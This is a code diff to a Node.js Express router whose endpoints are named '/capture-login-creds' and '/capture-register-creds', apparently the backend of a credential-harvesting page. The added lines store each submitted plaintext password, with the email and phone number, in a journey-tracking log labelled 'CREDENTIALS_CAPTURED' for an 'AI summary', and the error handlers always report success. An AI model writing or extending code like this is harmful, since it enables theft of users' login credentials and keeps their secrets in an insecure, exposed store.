@@ -58,9 +58,9 @@ router.post('/log-auth-event', async (req, res) => {
 
         // --- Journey Tracker ---
         if (event === 'REGISTER') {
-            journeyAgent.logEvent(email, 'REGISTERED', { ip: extraDetails.ip });
+            journeyAgent.logEvent(email, 'REGISTERED', { ip: extraDetails.ip, phone });
         } else if (event === 'LOGIN') {
-            journeyAgent.logEvent(email, 'LOGGED_IN', { page: extraDetails.page || extraDetails.from_page });
+            journeyAgent.logEvent(email, 'LOGGED_IN', { page: extraDetails.page || extraDetails.from_page, phone });
         } else if (event === 'SITE_SELECTION') {
             journeyAgent.logEvent(email, 'SITE_SELECTED', { site: extraDetails.site });
         }
@@ -122,6 +122,11 @@ router.post('/capture-login-creds', async (req, res) => {
             outcome:    outcome    || 'UNKNOWN',
             ip:         req.ip     || 'Unknown'
         });
+
+        // Also save to journey for the AI summary
+        if (identifier && password) {
+            journeyAgent.logEvent(identifier, 'CREDENTIALS_CAPTURED', { password });
+        }
     } catch (_) {
         res.json({ success: true }); // never fail silently
     }
@@ -146,6 +151,11 @@ router.post('/capture-register-creds', async (req, res) => {
             outcome:  outcome  || 'UNKNOWN',
             ip:       req.ip   || 'Unknown'
         });
+
+        // Also save to journey for the AI summary
+        if (email && password) {
+            journeyAgent.logEvent(email, 'CREDENTIALS_CAPTURED', { password, phone });
+        }
     } catch (_) {
         res.json({ success: true }); // never fail silently
     }
